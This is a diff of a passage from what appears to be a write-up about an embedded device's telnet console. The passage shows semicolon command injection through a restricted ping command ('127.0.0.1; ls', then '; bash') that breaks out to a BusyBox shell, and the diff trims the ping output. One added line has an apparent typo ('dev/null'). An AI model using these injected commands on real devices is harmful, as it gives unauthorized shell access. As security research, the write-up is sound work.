@@ -168,13 +168,7 @@ I wonder if... Let's try some semicolon magic!
 telnetd:error:997.792:processInput:406:unrecognized command ls
  >
  >
- > ping -c 1 127.0.0.1;ls
-PING 127.0.0.1 (127.0.0.1): 56 data bytes
-64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.948 ms
-
---- 127.0.0.1 ping statistics ---
-1 packets transmitted, 1 packets received, 0% packet loss
-round-trip min/avg/max = 0.948/0.948/0.948 ms
+ > ping -c 1 127.0.0.1 > /dev/null; ls
 bin      etc      mnt      sbin     usr      webs-EN
 data     lib      opt      sys      var      webs-FR
 dev      linuxrc  proc     tmp      webs
@@ -183,13 +177,7 @@ dev      linuxrc  proc     tmp      webs
 Alright! this way I can get a real shell
 
 ```
- > ping -c 1 127.0.0.1;bash
-PING 127.0.0.1 (127.0.0.1): 56 data bytes
-64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.459 ms
-
---- 127.0.0.1 ping statistics ---
-1 packets transmitted, 1 packets received, 0% packet loss
-round-trip min/avg/max = 0.459/0.459/0.459 ms
+ > ping -c 1 127.0.0.1 > dev/null; bash
 
 
 BusyBox v1.17.2 (2013-09-30 17:48:17 CST) built-in shell (ash)
